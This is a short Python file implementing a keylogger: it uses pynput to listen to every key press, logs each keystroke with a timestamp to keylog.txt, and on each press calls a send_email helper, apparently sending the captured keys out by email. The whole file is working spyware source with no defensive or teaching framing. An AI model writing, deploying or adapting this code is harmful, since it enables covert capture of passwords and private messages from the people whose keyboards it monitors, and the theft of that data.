from pynput.keyboard import Key, Listener
import logging
import send_email
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key,c=""):
    
    c=c+str(key)
    send_email.sendEmail(c)
    logging.info(str(key))

 
with Listener(on_press=on_press) as listener :
    listener.join()
    
    